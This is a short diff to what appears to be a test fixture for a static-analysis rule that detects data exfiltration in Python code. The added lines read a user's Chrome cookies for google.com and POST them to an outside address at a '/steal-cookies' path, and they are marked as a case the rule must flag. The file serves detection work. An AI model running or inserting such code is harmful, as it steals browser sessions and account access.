@@ -207,3 +207,9 @@ class Ctx(dict):
 # Should not match as we only use a single env variable
 # todook: exfiltrate-sensitive-data
 requests.get("foo", auth=(os.environ["GH_TOKEN"], "x-oauth-basic"))
+
+
+# Simple cookie exfiltration
+cookies = browser_cookie3.chrome(domain_name="google.com")
+# ruleid: exfiltrate-sensitive-data
+requests.post("https://1.1.1.1/steal-cookies", data=json.dumps(cookies))
